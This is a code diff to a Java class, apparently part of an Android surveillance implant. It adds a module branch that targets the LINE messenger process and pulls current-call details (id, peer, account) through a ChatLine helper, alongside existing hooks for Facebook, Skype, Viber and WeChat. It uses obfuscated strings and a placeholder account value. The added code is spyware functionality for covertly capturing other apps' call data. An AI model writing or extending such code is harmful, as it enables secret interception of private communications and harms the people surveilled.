@@ -3,6 +3,7 @@ package com.android.dvci.module.call;
 import com.android.dvci.auto.Cfg;
 import com.android.dvci.db.GenericSqliteHelper;
 import com.android.dvci.module.chat.ChatFacebook;
+import com.android.dvci.module.chat.ChatLine;
 import com.android.dvci.module.chat.ChatSkype;
 import com.android.dvci.module.chat.ChatViber;
 import com.android.dvci.module.chat.ChatWeChat;
@@ -150,6 +151,40 @@ public class CallInfo {
 				helper.disposeDb();
 			}
 
+			return ret;
+
+		} else if (this.programId == 0x014a) {
+			boolean ret = false;
+			this.processName = M.e("jp.naver.line.android");
+			this.delay = true;
+			this.realRate = true;
+
+			// open DB
+			if (end) {
+				//todo:fix this:
+				/*
+				String account = ChatLine.getAccount();
+				if(account.equals("") ){
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (updateCallInfo) failed to get account for line ");
+					}
+				}
+				this.account = account;
+				*/
+				this.account = "my account";
+					ret = ChatLine.getCurrentCall(this);
+
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (updateCallInfo) id: " + this.id);
+				}
+			} else {
+				this.account = M.e("delay");
+				this.peer = M.e("delay");
+				ret = true;
+			}
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " LINE (updateCallInfo): id: " + this.id + " peer: " + this.peer + "returning:" + ret);
+			}
 			return ret;
 
 		} else if (this.programId == 0x0148) {
